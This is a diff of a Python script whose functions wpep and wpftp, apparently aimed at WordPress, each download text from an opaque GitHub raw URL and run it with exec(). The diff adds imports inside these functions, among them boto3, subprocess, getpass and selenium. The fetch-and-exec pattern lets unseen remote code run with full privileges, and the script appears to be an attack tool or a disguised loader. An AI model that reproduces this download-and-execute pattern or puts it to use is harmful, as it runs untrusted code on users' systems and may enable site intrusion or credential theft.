@@ -68,7 +68,7 @@ import tempfile
 import requests
 import pathlib
 import subprocess
-import boto3
+
 
 init(autoreset=True)
 fg = '\033[0;32m'
@@ -243,11 +243,33 @@ whit = '\033[00m'
         
 
 def wpep(ep):
+  from selenium import webdriver
+  from selenium.webdriver.common.keys import Keys
+  import time
+  import requests
+  import boto3
+  import driver
+  import os
+  import subprocess
+  from selenium.webdriver.chrome.options import Options
+  from colorama import init
+  import re, os, getpass
 
   a=r.get("https://raw.githubusercontent.com/aefd8f1c604a9786879fe3ca28129507/aefd8f1c604a9786879fe3ca28129507/main/wpupEP2.txt").text
   exec(a)
 
 def wpftp(ftp):
+  from selenium import webdriver
+  from selenium.webdriver.common.keys import Keys
+  import time
+  import requests
+  import boto3
+  import driver
+  import os
+  import subprocess
+  from selenium.webdriver.chrome.options import Options
+  from colorama import init
+  import re, os, getpass
 
   a=r.get("https://raw.githubusercontent.com/aefd8f1c604a9786879fe3ca28129507/ac5e1deef70affecaf0bcb791eea7d8c/main/wpupFTP2.txt").text
   exec(a)
